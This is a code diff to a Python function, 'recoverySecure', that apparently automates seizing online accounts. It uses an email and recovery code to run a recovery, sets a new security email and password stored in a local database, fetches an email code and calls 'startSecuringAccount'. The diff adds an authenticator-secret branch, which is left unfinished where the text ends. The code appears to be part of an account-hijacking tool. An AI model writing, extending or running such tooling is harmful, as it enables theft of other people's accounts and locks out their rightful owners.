@@ -10,7 +10,7 @@ from views.utils.initialSession import getSession
 from database.database import DBConnection
 import uuid
 
-async def recoverySecure(email: str, recovery_code: str) -> dict:
+async def recoverySecure(email: str, type: str, data: dict) -> dict:
 
     session = getSession()
 
@@ -24,21 +24,30 @@ async def recoverySecure(email: str, recovery_code: str) -> dict:
         database.addSecurityEmail(security_email, password)
 
     print("[~] - Automaticly Securing Account...")
-    data = await recover(session, email, recovery_code, security_email, password, type)
-    print(data)
-    if not data:
-        return data
+    match type:
+        case "rcode":
+            recovery_code = data["recovery_code"]
+        
+            data = await recover(session, email, recovery_code, security_email, password, type)
+            print(data)
+            if not data:
+                return data
 
-    await getLiveData(session)
-    await sendAuth(session, email)
+            await getLiveData(session)
+            await sendAuth(session, email)
 
-    code = await getEmailCode(type)
+            code = await getEmailCode(type)
 
-    account = await startSecuringAccount(
-        session = session,
-        email = email,
-        code = code,
-        recovery = False
-    )
+            account = await startSecuringAccount(
+                session = session,
+                email = email,
+                code = code,
+                recovery = False
+            )
 
-    print(account)
+            print(account)
+        case "authpwd":
+            secret = data["auth_secret"]
+            password = data["password"]
+
+            
